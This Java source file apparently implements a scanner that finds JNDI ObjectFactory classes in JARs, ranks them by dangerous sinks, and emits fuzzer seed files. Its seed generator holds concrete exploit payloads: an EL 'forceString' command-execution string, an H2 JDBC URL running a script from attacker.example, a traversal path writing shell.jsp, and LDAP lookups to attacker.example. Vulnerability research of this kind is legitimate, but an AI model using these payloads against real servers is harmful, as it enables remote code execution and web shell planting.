package iocd;

import iocd.ClassDatabase.ClassInfo;
import iocd.ClassDatabase.MethodInfo;
import iocd.ClassDatabase.CallSite;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.stream.Collectors;

/**
 * Static analyzer for JNDI ObjectFactory abuse discovery.
 *
 * Scans classpath JARs for classes implementing {@code javax.naming.spi.ObjectFactory}
 * and analyzes their {@code getObjectInstance()} methods for exploitable patterns:
 *
 * <ol>
 *   <li>BeanFactory pattern: property setter → dangerous method invocation</li>
 *   <li>DataSource pattern: connection URL → JDBC driver exploitation</li>
 *   <li>File write pattern: path parameter → filesystem write</li>
 *   <li>Class load pattern: class name → class instantiation</li>
 *   <li>JNDI re-lookup pattern: internal JNDI call → chained exploitation</li>
 * </ol>
 *
 * Outputs:
 * <ul>
 *   <li>factory_catalog.json: All discovered factories with exploit potential</li>
 *   <li>_factory_type_hierarchy.json: Interface → implementation map for fuzzer</li>
 *   <li>jndi_seeds/: Generated IR seed files for each exploitable factory</li>
 * </ul>
 *
 * Usage:
 *   java -cp "iocd_classes;gson.jar;asm.jar;asm-commons.jar" \
 *        iocd.ObjectFactoryScanner \
 *        --jars "tomcat-catalina.jar;h2.jar;..." \
 *        --output path/to/output/ \
 *        [--verbose]
 */
public class ObjectFactoryScanner {

    // ── ObjectFactory interface signatures ────────────────────────
    private static final String OBJECT_FACTORY_IFACE = "javax/naming/spi/ObjectFactory";
    private static final String DIR_OBJECT_FACTORY_IFACE = "javax/naming/spi/DirObjectFactory";
    private static final String GET_OBJECT_INSTANCE = "getObjectInstance";

    // ── Dangerous sink patterns in getObjectInstance() ────────────
    // Maps call-site owner+method → exploit category
    private static final Map<String, String> SINK_PATTERNS = new LinkedHashMap<>();
    static {
        // Reflection sinks (BeanFactory pattern: forceString → Method.invoke)
        SINK_PATTERNS.put("java/lang/reflect/Method.invoke", "reflection_invoke");
        SINK_PATTERNS.put("java/lang/reflect/Constructor.newInstance", "reflection_newinstance");

        // Script evaluation sinks
        SINK_PATTERNS.put("javax/script/ScriptEngine.eval", "script_eval");
        SINK_PATTERNS.put("javax/el/ValueExpression.getValue", "el_eval");
        SINK_PATTERNS.put("javax/el/MethodExpression.invoke", "el_invoke");

        // JNDI re-lookup (chained JNDI → JNDI)
        SINK_PATTERNS.put("javax/naming/InitialContext.lookup", "jndi_relookup");
        SINK_PATTERNS.put("javax/naming/Context.lookup", "jndi_relookup");
        SINK_PATTERNS.put("javax/naming/InitialContext.doLookup", "jndi_relookup");

        // JDBC connection (DataSource factories)
        SINK_PATTERNS.put("java/sql/DriverManager.getConnection", "jdbc_connect");
        SINK_PATTERNS.put("javax/sql/DataSource.getConnection", "jdbc_connect");

        // Class loading
        SINK_PATTERNS.put("java/lang/Class.forName", "class_load");
        SINK_PATTERNS.put("java/lang/ClassLoader.loadClass", "class_load");
        SINK_PATTERNS.put("java/net/URLClassLoader.<init>", "remote_classload");
        SINK_PATTERNS.put("java/net/URLClassLoader.newInstance", "remote_classload");

        // File operations
        SINK_PATTERNS.put("java/io/FileOutputStream.<init>", "file_write");
        SINK_PATTERNS.put("java/io/FileWriter.<init>", "file_write");
        SINK_PATTERNS.put("java/io/File.<init>", "file_access");
        SINK_PATTERNS.put("java/nio/file/Files.write", "file_write");
        SINK_PATTERNS.put("java/nio/file/Files.newOutputStream", "file_write");

        // Command execution
        SINK_PATTERNS.put("java/lang/Runtime.exec", "cmd_exec");
        SINK_PATTERNS.put("java/lang/ProcessBuilder.start", "cmd_exec");

        // Network
        SINK_PATTERNS.put("java/net/URL.openConnection", "network");
        SINK_PATTERNS.put("java/net/Socket.<init>", "network");
        SINK_PATTERNS.put("java/net/HttpURLConnection.connect", "network");

        // Deserialization (nested deser in factory)
        SINK_PATTERNS.put("java/io/ObjectInputStream.readObject", "nested_deser");
        SINK_PATTERNS.put("java/io/ObjectInputStream.readUnshared", "nested_deser");

        // Thread (for async exploitation)
        SINK_PATTERNS.put("java/lang/Thread.start", "thread_spawn");

        // XML parsing (XXE in factory)
        SINK_PATTERNS.put("javax/xml/parsers/DocumentBuilder.parse", "xml_parse");
        SINK_PATTERNS.put("javax/xml/parsers/SAXParser.parse", "xml_parse");
        SINK_PATTERNS.put("org/xml/sax/XMLReader.parse", "xml_parse");
    }

    // ── Reference attribute access patterns ──────────────────────
    // Indicates the factory reads user-controlled Reference attributes
    private static final Set<String> REF_ATTR_METHODS = new LinkedHashSet<>();
    static {
        REF_ATTR_METHODS.add("javax/naming/Reference.get");
        REF_ATTR_METHODS.add("javax/naming/Reference.getAll");
        REF_ATTR_METHODS.add("javax/naming/Reference.getFactoryClassName");
        REF_ATTR_METHODS.add("javax/naming/Reference.getClassName");
        REF_ATTR_METHODS.add("javax/naming/RefAddr.getContent");
        REF_ATTR_METHODS.add("javax/naming/StringRefAddr.getContent");
        REF_ATTR_METHODS.add("javax/naming/BinaryRefAddr.getContent");
    }

    // ── Bean introspection patterns (BeanFactory-like) ───────────
    private static final Set<String> BEAN_INTRO_METHODS = new LinkedHashSet<>();
    static {
        BEAN_INTRO_METHODS.add("java/beans/Introspector.getBeanInfo");
        BEAN_INTRO_METHODS.add("java/beans/BeanInfo.getPropertyDescriptors");
        BEAN_INTRO_METHODS.add("java/beans/PropertyDescriptor.getWriteMethod");
        BEAN_INTRO_METHODS.add("java/beans/PropertyDescriptor.getReadMethod");
        BEAN_INTRO_METHODS.add("org/apache/commons/beanutils/PropertyUtils.setProperty");
        BEAN_INTRO_METHODS.add("org/apache/commons/beanutils/BeanUtils.setProperty");
    }

    // ── Results ──────────────────────────────────────────────────

    static class FactoryAnalysis {
        String factoryClass;         // FQCN (dot-separated)
        String factoryInternalName;  // internal name (slash-separated)
        boolean implementsObjectFactory;
        boolean implementsDirObjectFactory;
        List<String> sinkCategories = new ArrayList<>();
        List<String> sinkDetails = new ArrayList<>();  // "category: owner.method"
        boolean readsRefAttrs;       // reads Reference attributes
        boolean usesBeanIntrospection; // BeanFactory pattern
        int methodDepthToSink = -1;  // how many method calls to reach sink
        String exploitPattern;       // classified pattern name
        int riskScore;               // 0-100
        Map<String, Object> seedTemplate;  // generated IR template
    }

    // ── Main ─────────────────────────────────────────────────────

    public static void main(String[] args) throws Exception {
        String jarList = null;
        String outputDir = null;
        boolean verbose = false;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--jars": jarList = args[++i]; break;
                case "--output": outputDir = args[++i]; break;
                case "--verbose": verbose = true; break;
                default:
                    System.err.println("Unknown argument: " + args[i]);
                    printUsage();
                    System.exit(1);
            }
        }

        if (jarList == null || outputDir == null) {
            printUsage();
            System.exit(1);
        }

        Path outPath = Paths.get(outputDir);
        Files.createDirectories(outPath);
        Path seedDir = outPath.resolve("jndi_seeds");
        Files.createDirectories(seedDir);

        // Phase 1: Scan JARs into ClassDatabase
        log("Phase 1: Scanning JARs...");
        ClassDatabase db = new ClassDatabase();
        String[] jars = jarList.split("[;,:]");
        for (String jar : jars) {
            jar = jar.trim();
            if (jar.isEmpty()) continue;
            Path jarPath = Paths.get(jar);
            if (!Files.exists(jarPath)) {
                log("  WARN: JAR not found: " + jar);
                continue;
            }
            try {
                db.scanJar(jarPath);
                if (verbose) log("  Scanned: " + jar);
            } catch (Exception e) {
                log("  WARN: Failed to scan " + jar + ": " + e.getMessage());
            }
        }
        log("  Total classes: " + db.size());

        // Phase 2: Resolve hierarchy
        log("Phase 2: Resolving class hierarchy...");
        db.resolveHierarchy();

        // Phase 3: Find ObjectFactory implementations
        log("Phase 3: Finding ObjectFactory implementations...");
        List<ClassInfo> factories = findObjectFactories(db);
        log("  ObjectFactory implementations found: " + factories.size());

        // Phase 4: Analyze each factory
        log("Phase 4: Analyzing factories for exploitable patterns...");
        List<FactoryAnalysis> analyses = new ArrayList<>();
        for (ClassInfo ci : factories) {
            FactoryAnalysis analysis = analyzeFactory(ci, db, verbose);
            if (analysis != null) {
                analyses.add(analysis);
                if (verbose) {
                    log("  " + analysis.factoryClass +
                        " → sinks=" + analysis.sinkCategories +
                        " refAttrs=" + analysis.readsRefAttrs +
                        " beanIntro=" + analysis.usesBeanIntrospection +
                        " risk=" + analysis.riskScore);
                }
            }
        }

        // Sort by risk score descending
        analyses.sort((a, b) -> Integer.compare(b.riskScore, a.riskScore));

        // Phase 5: Classify exploit patterns
        log("Phase 5: Classifying exploit patterns...");
        for (FactoryAnalysis a : analyses) {
            classifyExploitPattern(a);
            generateSeedTemplate(a);
        }

        // Phase 6: Output results
        log("Phase 6: Writing results...");
        Gson gson = new GsonBuilder().setPrettyPrinting().disableHtmlEscaping().create();

        // factory_catalog.json — full analysis
        String catalogJson = gson.toJson(analyses);
        Files.writeString(outPath.resolve("factory_catalog.json"), catalogJson);

        // _factory_type_hierarchy.json — for fuzzer TYPE_HIERARCHY merge
        Map<String, List<String>> typeHierarchy = buildTypeHierarchy(analyses);
        String hierarchyJson = gson.toJson(typeHierarchy);
        Files.writeString(outPath.resolve("_factory_type_hierarchy.json"), hierarchyJson);

        // Individual seed files
        int seedCount = 0;
        for (FactoryAnalysis a : analyses) {
            if (a.seedTemplate != null && a.riskScore >= 20) {
                String seedJson = gson.toJson(a.seedTemplate);
                String safeName = a.factoryClass
                    .replaceAll("[^a-zA-Z0-9.]", "_")
                    .toLowerCase();
                String filename = String.format("%03d_factory_%s.json",
                    seedCount + 1, safeName);
                Files.writeString(seedDir.resolve(filename), seedJson);
                seedCount++;
            }
        }

        // Summary
        long highRisk = analyses.stream().filter(a -> a.riskScore >= 70).count();
        long medRisk = analyses.stream().filter(a -> a.riskScore >= 40 && a.riskScore < 70).count();
        long lowRisk = analyses.stream().filter(a -> a.riskScore > 0 && a.riskScore < 40).count();

        log("\n=== RESULTS ===");
        log("Total factories analyzed: " + analyses.size());
        log("  HIGH risk (≥70):  " + highRisk);
        log("  MEDIUM risk (40-69): " + medRisk);
        log("  LOW risk (1-39):  " + lowRisk);
        log("Seeds generated: " + seedCount);
        log("Output directory: " + outPath.toAbsolutePath());

        // Print top-10 most dangerous factories
        log("\nTop-10 most dangerous factories:");
        for (int i = 0; i < Math.min(10, analyses.size()); i++) {
            FactoryAnalysis a = analyses.get(i);
            log(String.format("  %d. [%d] %s → %s (%s)",
                i + 1, a.riskScore, a.factoryClass,
                a.exploitPattern, String.join(", ", a.sinkCategories)));
        }
    }

    // ── Phase 3: Find ObjectFactory implementations ──────────────

    static List<ClassInfo> findObjectFactories(ClassDatabase db) {
        List<ClassInfo> result = new ArrayList<>();
        for (ClassInfo ci : db.allClasses()) {
            if (ci.isAbstract || ci.isInterface) continue;

            // Check if this class implements ObjectFactory or DirObjectFactory
            if (implementsInterface(ci, OBJECT_FACTORY_IFACE, db) ||
                implementsInterface(ci, DIR_OBJECT_FACTORY_IFACE, db)) {
                result.add(ci);
            }
        }
        return result;
    }

    static boolean implementsInterface(ClassInfo ci, String iface, ClassDatabase db) {
        // Direct check
        if (ci.interfaces != null && ci.interfaces.contains(iface)) return true;

        // Check superclass chain
        Set<String> visited = new HashSet<>();
        Queue<String> queue = new LinkedList<>();
        if (ci.superName != null) queue.add(ci.superName);
        if (ci.interfaces != null) queue.addAll(ci.interfaces);

        while (!queue.isEmpty()) {
            String name = queue.poll();
            if (!visited.add(name)) continue;
            if (name.equals(iface)) return true;

            ClassInfo parent = db.getClass(name);
            if (parent != null) {
                if (parent.superName != null) queue.add(parent.superName);
                if (parent.interfaces != null) queue.addAll(parent.interfaces);
            }
        }
        return false;
    }

    // ── Phase 4: Analyze a single factory ────────────────────────

    static FactoryAnalysis analyzeFactory(ClassInfo ci, ClassDatabase db, boolean verbose) {
        FactoryAnalysis analysis = new FactoryAnalysis();
        analysis.factoryClass = ci.name.replace('/', '.');
        analysis.factoryInternalName = ci.name;
        analysis.implementsObjectFactory =
            implementsInterface(ci, OBJECT_FACTORY_IFACE, db);
        analysis.implementsDirObjectFactory =
            implementsInterface(ci, DIR_OBJECT_FACTORY_IFACE, db);

        // Find getObjectInstance method
        MethodInfo goiMethod = null;
        for (MethodInfo mi : ci.methods.values()) {
            if (mi.name.equals(GET_OBJECT_INSTANCE)) {
                goiMethod = mi;
                break;
            }
        }

        if (goiMethod == null) {
            // No getObjectInstance — check superclass
            // (might inherit from abstract factory)
            analysis.riskScore = 0;
            return analysis;
        }

        // Analyze call sites in getObjectInstance and reachable methods
        Set<String> visitedMethods = new HashSet<>();
        analyzeMethodCallSites(ci, goiMethod, db, analysis, visitedMethods, 0, 3);

        // Calculate risk score
        analysis.riskScore = calculateRiskScore(analysis);

        return analysis;
    }

    static void analyzeMethodCallSites(
            ClassInfo ownerClass,
            MethodInfo method,
            ClassDatabase db,
            FactoryAnalysis analysis,
            Set<String> visited,
            int depth,
            int maxDepth) {

        String methodKey = ownerClass.name + "." + method.name + method.desc;
        if (!visited.add(methodKey)) return;
        if (depth > maxDepth) return;

        for (CallSite cs : method.callSites) {
            String callKey = cs.owner + "." + cs.name;

            // Check for sink patterns
            String sinkCat = SINK_PATTERNS.get(callKey);
            if (sinkCat != null) {
                if (!analysis.sinkCategories.contains(sinkCat)) {
                    analysis.sinkCategories.add(sinkCat);
                }
                String detail = sinkCat + ": " + cs.owner.replace('/', '.') + "." + cs.name;
                analysis.sinkDetails.add(detail);
                if (analysis.methodDepthToSink < 0 || depth < analysis.methodDepthToSink) {
                    analysis.methodDepthToSink = depth;
                }
            }

            // Check for Reference attribute access
            if (REF_ATTR_METHODS.contains(callKey)) {
                analysis.readsRefAttrs = true;
            }

            // Check for bean introspection
            if (BEAN_INTRO_METHODS.contains(callKey)) {
                analysis.usesBeanIntrospection = true;
            }

            // Recurse into called methods within same class (intra-class analysis)
            if (cs.owner.equals(ownerClass.name)) {
                String subKey = cs.name + cs.desc;
                MethodInfo subMethod = ownerClass.methods.get(subKey);
                if (subMethod != null) {
                    analyzeMethodCallSites(ownerClass, subMethod, db, analysis,
                        visited, depth + 1, maxDepth);
                }
            }

            // Also check 1-depth into called external classes
            if (depth < 1) {
                ClassInfo calledClass = db.getClass(cs.owner);
                if (calledClass != null) {
                    for (MethodInfo mi : calledClass.methods.values()) {
                        if (mi.name.equals(cs.name)) {
                            analyzeMethodCallSites(calledClass, mi, db, analysis,
                                visited, depth + 1, maxDepth);
                            break;
                        }
                    }
                }
            }
        }
    }

    // ── Phase 4.1: Risk score calculation ────────────────────────

    static int calculateRiskScore(FactoryAnalysis a) {
        int score = 0;

        // Sink categories (highest weight)
        for (String cat : a.sinkCategories) {
            switch (cat) {
                case "cmd_exec":          score += 40; break;
                case "reflection_invoke": score += 35; break;
                case "script_eval":       score += 35; break;
                case "el_eval":           score += 35; break;
                case "el_invoke":         score += 35; break;
                case "jdbc_connect":      score += 30; break;
                case "jndi_relookup":     score += 30; break;
                case "remote_classload":  score += 30; break;
                case "class_load":        score += 25; break;
                case "nested_deser":      score += 25; break;
                case "file_write":        score += 25; break;
                case "network":           score += 20; break;
                case "xml_parse":         score += 15; break;
                case "file_access":       score += 10; break;
                case "thread_spawn":      score += 5;  break;
                case "reflection_newinstance": score += 30; break;
            }
        }

        // Reference attribute access (attacker controls input)
        if (a.readsRefAttrs) score += 15;

        // Bean introspection (BeanFactory pattern — very exploitable)
        if (a.usesBeanIntrospection) score += 20;

        // Proximity bonus: closer sink = more likely exploitable
        if (a.methodDepthToSink == 0) score += 10;
        else if (a.methodDepthToSink == 1) score += 5;

        return Math.min(100, score);
    }

    // ── Phase 5: Classify exploit pattern ────────────────────────

    static void classifyExploitPattern(FactoryAnalysis a) {
        if (a.usesBeanIntrospection && a.sinkCategories.contains("reflection_invoke")) {
            a.exploitPattern = "bean_factory_reflection";
        } else if (a.sinkCategories.contains("jdbc_connect")) {
            a.exploitPattern = "datasource_jdbc";
        } else if (a.sinkCategories.contains("el_eval") || a.sinkCategories.contains("el_invoke")) {
            a.exploitPattern = "el_evaluation";
        } else if (a.sinkCategories.contains("script_eval")) {
            a.exploitPattern = "script_evaluation";
        } else if (a.sinkCategories.contains("jndi_relookup")) {
            a.exploitPattern = "jndi_chain";
        } else if (a.sinkCategories.contains("file_write")) {
            a.exploitPattern = "file_write";
        } else if (a.sinkCategories.contains("cmd_exec")) {
            a.exploitPattern = "direct_cmd_exec";
        } else if (a.sinkCategories.contains("remote_classload") || a.sinkCategories.contains("class_load")) {
            a.exploitPattern = "class_loading";
        } else if (a.sinkCategories.contains("nested_deser")) {
            a.exploitPattern = "nested_deserialization";
        } else if (a.sinkCategories.contains("xml_parse")) {
            a.exploitPattern = "xxe_in_factory";
        } else if (a.sinkCategories.contains("network")) {
            a.exploitPattern = "network_ssrf";
        } else if (a.sinkCategories.contains("reflection_newinstance")) {
            a.exploitPattern = "reflection_instantiation";
        } else {
            a.exploitPattern = "unknown";
        }
    }

    // ── Phase 5.1: Generate seed IR template ─────────────────────

    static void generateSeedTemplate(FactoryAnalysis a) {
        if (a.riskScore < 20) return;

        Map<String, Object> ir = new LinkedHashMap<>();
        ir.put("attack_type", "jndi_factory");
        ir.put("factory_class", a.factoryClass);

        switch (a.exploitPattern) {
            case "bean_factory_reflection": {
                ir.put("reference_class", "javax.el.ELProcessor");
                Map<String, String> attrs = new LinkedHashMap<>();
                attrs.put("forceString", "x=eval");
                attrs.put("x", "Runtime.getRuntime().exec('id')");
                ir.put("factory_attrs", attrs);
                ir.put("sink_type", "el_eval");
                break;
            }
            case "datasource_jdbc": {
                ir.put("reference_class", "javax.sql.DataSource");
                Map<String, String> attrs = new LinkedHashMap<>();
                attrs.put("url", "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'");
                attrs.put("driverClassName", "org.h2.Driver");
                ir.put("factory_attrs", attrs);
                ir.put("sink_type", "jdbc_h2_runscript");
                break;
            }
            case "el_evaluation": {
                ir.put("reference_class", "javax.el.ELProcessor");
                Map<String, String> attrs = new LinkedHashMap<>();
                attrs.put("forceString", "x=eval");
                attrs.put("x", "Runtime.getRuntime().exec('id')");
                ir.put("factory_attrs", attrs);
                ir.put("sink_type", "el_eval");
                break;
            }
            case "file_write": {
                ir.put("reference_class", "java.io.File");
                Map<String, String> attrs = new LinkedHashMap<>();
                attrs.put("pathname", "../../webapps/ROOT/shell.jsp");
                attrs.put("readonly", "false");
                ir.put("factory_attrs", attrs);
                ir.put("sink_type", "file_write");
                break;
            }
            case "jndi_chain": {
                ir.put("reference_class", "javax.naming.Context");
                Map<String, String> attrs = new LinkedHashMap<>();
                attrs.put("url", "ldap://attacker.example:1389/exploit");
                ir.put("factory_attrs", attrs);
                ir.put("sink_type", "jndi_relookup");
                break;
            }
            default: {
                ir.put("reference_class", "java.lang.Object");
                Map<String, String> attrs = new LinkedHashMap<>();
                attrs.put("payload", "Runtime.getRuntime().exec('id')");
                ir.put("factory_attrs", attrs);
                ir.put("sink_type", a.exploitPattern);
                break;
            }
        }

        ir.put("protocol", "ldap");
        ir.put("lookup_url", "ldap://attacker.example:1389/exploit");

        a.seedTemplate = ir;
    }

    // ── Build type hierarchy for fuzzer integration ──────────────

    static Map<String, List<String>> buildTypeHierarchy(List<FactoryAnalysis> analyses) {
        Map<String, List<String>> hierarchy = new LinkedHashMap<>();

        // Group by exploit pattern
        Map<String, List<String>> byPattern = new LinkedHashMap<>();
        for (FactoryAnalysis a : analyses) {
            if (a.riskScore >= 20) {
                byPattern.computeIfAbsent(
                    "jndi.factory." + a.exploitPattern,
                    k -> new ArrayList<>()
                ).add(a.factoryClass);
            }
        }
        hierarchy.putAll(byPattern);

        // All ObjectFactory implementations
        List<String> allFactories = analyses.stream()
            .map(a -> a.factoryClass)
            .collect(Collectors.toList());
        hierarchy.put("javax.naming.spi.ObjectFactory", allFactories);

        return hierarchy;
    }

    // ── Utility ──────────────────────────────────────────────────

    static void log(String msg) {
        System.err.println("[ObjectFactoryScanner] " + msg);
    }

    static void printUsage() {
        System.err.println("Usage: java iocd.ObjectFactoryScanner " +
            "--jars <jar1;jar2;...> --output <dir> [--verbose]");
    }
}
